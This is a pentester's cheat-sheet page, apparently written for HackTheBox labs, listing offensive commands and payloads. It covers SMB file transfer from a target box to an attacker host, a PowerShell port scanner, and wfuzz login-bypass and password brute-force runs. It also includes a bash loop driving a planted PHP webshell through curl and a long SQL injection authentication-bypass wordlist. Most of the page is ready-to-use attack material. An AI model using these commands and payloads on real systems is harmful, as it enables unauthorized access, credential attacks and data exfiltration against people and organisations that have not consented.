---
title: "Miscellaneous"
tags: [Metodologies]
categories: Metodology
mermaid: true
image: https://lojaam.com.br/media/catalog/product/cache/1/image/365x365/9df78eab33525d08d6e5fb8d27136e95/e/x/explorer_com_caneta.jpg
---

# Miscellaneous

Here I'll show some examples of miscellaneous tools and commands that I common use.

# Summary

- [Miscellaneous](#miscellaneous)
- [Summary](#summary)
- [File Transfer](#file-transfer)
  - [Windows File Transfer](#windows-file-transfer)
- [Commands](#commands)
  - [Powershell](#powershell)
  - [Gobuster](#gobuster)
  - [Wfuzz](#wfuzz)
  - [Bash Misc](#bash-misc)
  - [Pseudo WebShell PHP](#pseudo-webshell-php)
  - [Python Virtual Env](#python-virtual-env)
  - [Wordlist Auth Bypass](#wordlist-auth-bypass)
  - [Apt Proxy](#apt-proxy)

# File Transfer

Commands used to make file transfer between boxes

## Windows File Transfer

You can make a file transfer using samba share from impacket and powershell, and then easily get and send files to the remote server

On Windows Box

```ps1
$pass = convertto-securestring '123456' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('0x4rt3mis', $pass)
```

On Kali Box we start the impacket smb server

```sh
impacket-smbserver kalishare . -username 0x4rt3mis -password 123456
```

Now we enable the samba share on Windows

```ps1
New-PSDrive kalishare -PSProvider FileSystem -Credential $cred -Root \\10.10.16.5\kalishare
```

Or

```ps1
net use \\10.10.16.5\kalishare /u:0x4rt3mis 123456
cp archive.zip \\10.10.16.5\kalishare
```

# Commands

Let's jump in.

## Powershell

Get the size of folders

```ps1
Get-ChildItem -Recurse 'C:\inetpub\wwwroot' | Measure-Object -Property Length -Sum
```

Zip Folder

```ps1
Compress-Archive -Path .\htdocs -DestinationPath archive.zip
```

Port Scan

```ps1
8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("ip",$_)) "Port $_ is open!"} 2>$null
```

## Gobuster

```sh
gobuster dir -u http://x.x.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

## Wfuzz

Login Bypass

```sh
wfuzz -z file,list.txt -d "username=adminFUZZ&password=admin" --hc 200 http://10.10.10.185/login.php
```

Vhost Fuzzing

```sh
wfuzz -u http://10.10.10.208 -H "Host: FUZZ.crossfit.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 10701
```

Password Bruteforce

```sh
wfuzz -c -z file,common.txt --hh 18170 -d "Action=Login&RequestedURL=Action%3DAdmin&Lang=en&TimeOffset=240&User=root@localhost&Password=FUZZ" http://192.168.8.9/admin.php
```

## Bash Misc

Find

```sh
find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls
```

Grep Awesome

```sh
grep -l -R -e "\$_GET\['doc'\]" $(grep -l -R -e "\$_GET\['app'\]" `grep -l -R -e vqmods`)
```

Small ssh key

```sh
ssh-keygen -t ed25519 -f 0x4rt3mis
```

## Pseudo WebShell PHP

```sh
#!/bin/bash
# 0x4rt3mis
# Shell "pseudo" - Compromissed HackTheBox

echo "exit for exit"
input=""
while [ "$input" != "exit" ]
do
    echo -n "> "
    read input
    curl -GET http://10.10.10.207/shop/vqmod/xml/payload.php --data-urlencode "cmd=$input"
done
```

## Python Virtual Env

```py
virtualenv -p python2.7 exploit
cd exploit
source bin/activate
```

## Wordlist Auth Bypass

```
" "
" #
" --
"&"
"*"
"-"
"/*
"^"
'
' #
' '
' -
' --
'#
'&'
'*'
'-'
'--
'/*
'^'
=
==
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1?) and '1?='1-
admin" #
admin" --
admin"/*
admin' #
admin' --
admin'/*
admin' and substring(password/text(),1,1)='7
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin"or 1=1 or ""="
admin'or 1=1 or ''='
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1-
' and 1='1
' and a='a
' and 'one'='one
' and 'one'='one-
' and substring(password/text(),1,1)='7
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
" or "" "
" or ""&"
" or ""*"
" or ""-"
" or ""="
" or ""^"
' or '' '
' or ''&'
' or ''*'
' or ''-'
' or ''='
' or ''^'
'="or'
 or 0=0 #
 or 0=0 -
 or 0=0 --
" or 0=0 #
" or 0=0 -
" or 0=0 --
%' or '0'='0
' or         0=0 #
' or 0=0 #
' or 0=0 -
' or 0=0 --
 or 1=1
 or 1=1#
 or 1=1-
 or 1=1--
 or 1=1/*
" or "1"="1
" or "1"="1"#
" or "1"="1"--
" or "1"="1"/*
" or 1=1
" or 1=1 -
" or 1=1 --
" or 1=1#
" or 1=1-
" or 1=1--
" or 1=1/*
") or "1"="1
") or "1"="1"#
") or "1"="1"--
") or "1"="1"/*
") or ("1"="1
") or ("1"="1"#
") or ("1"="1"--
") or ("1"="1"/*
' or '1'='1
' or '1'='1'#
' or '1'='1'--
' or '1'='1'/*
' or '1?='1
' or 1=1
' or 1=1 -
' or 1=1 --
' or 1=1#
' or 1=1-
' or 1=1--
' or 1=1/*
' or 1=1;#
') or '1'='1
') or '1'='1'#
') or '1'='1'--
') or '1'='1'/*
') or '1'='1--
') or ('1'='1
') or ('1'='1'#
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1--
'or'1=1
'or'1=1?
) or '1?='1-
) or ('1?='1-
or 1=1
or 1=1#
or 1=1--
or 1=1/*
'OR 1=1--
' or 1=1 limit 1 -- -+
' or 1=1 LIMIT 1;#
"or 1=1 or ""="
'or 1=1 or ''='
" or "a"="a
") or ("a"="a
' or 'a'='a
' or a=a-
' or a=a--
') or ('a'='a
') or ('a'='a and hi") or ("a"="a
'OR '' = '	Allows authentication without a valid username.
'=' 'or' and '=' 'or'
' or 'one'='one
' or 'one'='one-
 or true
" or true--
") or true--
' or true--
') or true--
or true--
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
' or 'x'='x
') or ('x')=('x
') or ('x'='x
')) or (('x'))=(('x
' OR 'x'='x'#;
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
' UNION select table_schema,table_name FROM information_Schema.tables;#
<username>'--
<username>' OR 1=1--
```

## Apt Proxy

```sh
ssh -g -D 8000 kali@127.0.0.1
echo "Acquire::http::proxy \"socks5h://server:8000\";" > /etc/apt/apt.conf
```